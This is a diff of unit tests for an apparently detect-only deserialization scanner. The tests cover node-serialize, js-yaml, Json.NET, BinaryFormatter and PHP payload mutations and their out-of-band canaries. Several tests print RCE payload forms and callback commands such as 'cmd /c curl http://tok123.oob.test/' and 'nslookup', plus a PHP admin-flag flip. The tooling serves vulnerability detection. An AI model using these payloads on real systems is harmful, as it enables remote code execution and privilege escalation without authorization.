@@ -413,6 +413,76 @@ class TestNodeBlindOobVariant(unittest.TestCase):
         self.assertIn("isAdmin", raw)
 
 
+class TestNodeOobCanaryDoesNotCrashTarget(unittest.TestCase):
+    """Bug J (2026-11-22): the Node OOB canaries called require('http').get(url) with no
+    'error' listener. The canary host resolves (DNS hit logged) but the TCP connect is refused,
+    so Node raised an unhandled 'error' event and the target process EXITED — node3.json lost
+    17/19 vectors to 'Connection refused'. A detect-only tool must not take the target down."""
+
+    CLOSED = "127.0.0.1:1"   # nothing listens on port 1 -> ECONNREFUSED, like <token>.oob.test:80
+
+    def _node_oob(self):
+        import tool_config
+        tool_config.set_oob_override(self.CLOSED)
+        try:
+            results = mutate("_$$ND_FUNC$$_function(){return 1;}", "node_serialize", "node-serialize RCE")
+        finally:
+            tool_config.set_oob_override(None)
+        oob = [r for r in results if r.get("type") == "node_serialize_oob"]
+        self.assertEqual(len(oob), 1)
+        return decoded_payloads(oob)[0]
+
+    def _yaml_oob(self):
+        import tool_config
+        tool_config.set_oob_override(self.CLOSED)
+        try:
+            results = mutate("onLoad: !<tag:yaml.org,2002:js/function> 'function () { return true }'",
+                             "yaml_exec", "YAML JS Function RCE (js-yaml)")
+        finally:
+            tool_config.set_oob_override(None)
+        oob = [r for r in results if r.get("type") == "yaml_js_function_oob"]
+        self.assertEqual(len(oob), 1)
+        return decoded_payloads(oob)[0]
+
+    def test_both_node_oob_canaries_attach_an_error_listener(self):
+        for raw in (self._node_oob(), self._yaml_oob()):
+            self.assertIn("http://127.0.0.1:1/", raw)
+            self.assertIn(".on('error',function(){})", raw, raw)
+
+    def _run_in_node(self, js_expr_calling_canary: str) -> "subprocess.CompletedProcess":
+        # Run from a real file (not `node -e`) so process.mainModule exists, as in a real app.
+        import subprocess, tempfile
+        script = (
+            js_expr_calling_canary + ";\n"
+            "setTimeout(function(){ process.stdout.write('ALIVE'); }, 3000);\n"
+        )
+        with tempfile.TemporaryDirectory() as d:
+            path = os.path.join(d, "canary.js")
+            with open(path, "w", encoding="utf-8") as fh:
+                fh.write(script)
+            return subprocess.run(["node", path], capture_output=True, text=True, timeout=30)
+
+    @unittest.skipUnless(__import__("shutil").which("node"), "node not installed")
+    def test_node_serialize_canary_keeps_process_alive_on_refused_connect(self):
+        raw = self._node_oob()
+        self.assertTrue(raw.startswith("_$$ND_FUNC$$_"))
+        iife = raw[len("_$$ND_FUNC$$_"):]          # "function(){...}()" — what node-serialize eval()s
+        proc = self._run_in_node("(" + iife + ")")
+        self.assertEqual(proc.returncode, 0, proc.stderr)
+        self.assertIn("ALIVE", proc.stdout)
+
+    @unittest.skipUnless(__import__("shutil").which("node"), "node not installed")
+    def test_js_yaml_canary_keeps_process_alive_on_refused_connect(self):
+        import re
+        raw = self._yaml_oob()
+        m = re.search(r'js/function> "(.*)"\s*$', raw)
+        self.assertIsNotNone(m, raw)
+        src = m.group(1)                           # the function js-yaml rebuilds; the app then calls it
+        proc = self._run_in_node("(" + src + ")()")
+        self.assertEqual(proc.returncode, 0, proc.stderr)
+        self.assertIn("ALIVE", proc.stdout)
+
+
 class TestDotnetBlindOobVariant(unittest.TestCase):
     """.NET gains a blind-confirmation variant (Json.NET $type gadget whose command fetches the OOB
     collector), mirroring Java/Node — so a blind .NET sink can be confirmed via callback. Only emitted
@@ -435,6 +505,108 @@ class TestDotnetBlindOobVariant(unittest.TestCase):
         with patch("Analyze.payloadMutation.get_oob_domain", return_value=""):
             results = mutate('{"$type":"System.Object, mscorlib"}', "jsonnet", "JSON.NET TypeNameHandling RCE")
         self.assertFalse(any(r.get("type", "").startswith("dotnet_") and r.get("type", "").endswith("_oob") for r in results))
+
+
+class TestPhpMutationKeepsBytesExact(unittest.TestCase):
+    """Bug I (2026-11-21): PHP mutations re-encoded the latin-1 candidate with UTF-8, doubling every
+    byte >= 0x80 (s:5:"José" -> 7 bytes) so unserialize() failed. End-to-end through
+    normalize -> mutation -> replay rebuild, the server must get the original bytes with only
+    the intended token changed."""
+
+    def _server_bytes(self, php_bytes, probe="flip_boolean"):
+        from Analyze.normalize import DataNormalizer
+        from Replay.replay_request import ReplayRequest
+        cookie = base64.b64encode(php_bytes).decode()
+        norm = DataNormalizer(cookie)
+        cand = norm.normalize()[0]
+        vec = {"value": cand, "location": "cookie", "name": "session", "url": "http://x/", "method": "GET"}
+        with patch("Analyze.payloadMutation.get_oob_domain", return_value=""):
+            muts = PayloadMutation({"suggested_probe": probe, "exploit_type": "x"}, vec).mutate()
+        m = [x for x in muts if x.get("type") == probe][0]
+        m.update({"slot_value": cookie, "transform_chain": norm.get_transform_chain(cand),
+                  "encoding_chain": norm.get_encoding_chain(cand)})
+        return base64.b64decode(ReplayRequest()._select_payload_value(m))
+
+    def test_non_ascii_utf8_value_survives_flip_boolean(self):
+        php = 'O:4:"User":2:{s:8:"username";s:5:"José";s:5:"admin";b:0;}'.encode("utf-8")
+        self.assertEqual(self._server_bytes(php), php.replace(b"b:0;", b"b:1;"))
+
+    def test_vietnamese_value_survives_flip_boolean(self):
+        name = "Nguyễn".encode("utf-8")
+        php = b'O:4:"User":2:{s:8:"username";s:' + str(len(name)).encode() + b':"' + name + b'";s:5:"admin";b:0;}'
+        self.assertEqual(self._server_bytes(php), php.replace(b"b:0;", b"b:1;"))
+
+    def test_php_bytes_falls_back_to_utf8_for_real_text(self):
+        self.assertEqual(PayloadMutation._php_bytes('s:6:"ẻ";'), 's:6:"ẻ";'.encode("utf-8"))
+        self.assertEqual(PayloadMutation._php_bytes("Jos\xc3\xa9"), b"Jos\xc3\xa9")
+
+
+class TestDotnetJsonnetOobOnlyForJsonNetSinks(unittest.TestCase):
+    """Bug G (2026-11-21): the hand-built Json.NET $type OOB canary was appended to EVERY .NET probe,
+    so the BinaryFormatter sink /api/import-bin received JSON text ('7B-22-24-74…' parse error 500).
+    It must only be emitted when the resolved formatter is Json.Net."""
+
+    def _mutate_with_oob(self, probe, etype):
+        with patch("Analyze.payloadMutation.get_oob_domain", return_value="tok.oob.test"), \
+             patch("Analyze.payloadMutation.os.path.exists", return_value=False):
+            return PayloadMutation({"suggested_probe": probe, "exploit_type": etype},
+                                   {"value": "x", "location": "raw_body", "name": "payload"})._mutate_dotnet_oob()
+
+    def test_binaryformatter_sink_gets_no_jsonnet_canary(self):
+        out = self._mutate_with_oob("dotnet_deser", "BinaryFormatter RCE")
+        self.assertFalse(any(r.get("type") == "dotnet_jsonnet_oob" for r in out))
+
+    def test_jsonnet_sink_still_gets_jsonnet_canary(self):
+        # One canary per callback command (curl + nslookup since 2026-11-24, DNS-name domain).
+        out = self._mutate_with_oob("jsonnet", "JSON.NET TypeNameHandling RCE")
+        self.assertEqual(sum(r.get("type") == "dotnet_jsonnet_oob" for r in out), 2)
+
+
+class TestDotnetOobNslookupVariant(unittest.TestCase):
+    """Legacy .NET Framework hosts (Server 2012/2016, Win7) have no curl.exe, so `cmd /c curl`
+    dies before any DNS lookup and the OOB canary never reaches the collector. nslookup exists on
+    every Windows version; the DNS query for <token>.<domain> is itself the confirmation.
+    Mirrors Java's RCE_ESCALATION_OOB_COMMANDS (nslookup + curl)."""
+
+    def _jsonnet_canaries(self, domain):
+        with patch("Analyze.payloadMutation.get_oob_domain", return_value=domain), \
+             patch("Analyze.payloadMutation.os.path.exists", return_value=False):
+            out = PayloadMutation({"suggested_probe": "jsonnet", "exploit_type": "JSON.NET TypeNameHandling RCE"},
+                                  {"value": "x", "location": "raw_body", "name": "payload"})._mutate_dotnet_oob()
+        return decoded_payloads([r for r in out if r.get("type") == "dotnet_jsonnet_oob"])
+
+    def test_dns_domain_gets_curl_and_nslookup_canaries(self):
+        raws = self._jsonnet_canaries("tok123.oob.test")
+        self.assertEqual(len(raws), 2)
+        self.assertTrue(any('"/c curl http://tok123.oob.test/"' in r for r in raws), raws)
+        self.assertTrue(any('"/c nslookup tok123.oob.test"' in r for r in raws), raws)
+
+    def test_path_form_domain_skips_nslookup(self):
+        # Token lives in the URL path (host:port/<token>) — a DNS lookup could never carry it.
+        for domain in ("127.0.0.1:9000/tok", "oob.test.local/tok", "127.0.0.1"):
+            raws = self._jsonnet_canaries(domain)
+            self.assertEqual(len(raws), 1, domain)
+            self.assertIn("/c curl ", raws[0])
+            self.assertNotIn("nslookup", raws[0])
+
+    def test_ysonet_branch_runs_every_gadget_with_both_commands(self):
+        seen = []
+
+        def fake_ysonet(self_, formatter, gadget, command):
+            seen.append((formatter, gadget, command))
+            return base64.b64encode(b"stub").decode()
+
+        with patch("Analyze.payloadMutation.get_oob_domain", return_value="tok9.oob.test"), \
+             patch("Analyze.payloadMutation.os.path.exists", return_value=True), \
+             patch.object(PayloadMutation, "_run_ysonet", fake_ysonet):
+            out = PayloadMutation({"suggested_probe": "dotnet_deser", "exploit_type": "BinaryFormatter RCE"},
+                                  {"value": "x", "location": "raw_body", "name": "payload"})._mutate_dotnet_oob()
+        for gadget in PayloadMutation.DOTNET_GADGETS:
+            self.assertIn(("BinaryFormatter", gadget, "curl http://tok9.oob.test/"), seen)
+            self.assertIn(("BinaryFormatter", gadget, "nslookup tok9.oob.test"), seen)
+        labels = [r.get("chain") or "" for r in out if r.get("type") == "dotnet_ysonet_oob"]
+        self.assertTrue(any(l.endswith("dns callback") for l in labels), labels)
+        self.assertTrue(any(l.endswith("http callback") for l in labels), labels)
 
 
 class TestRubyDetectionCallbackChain(unittest.TestCase):
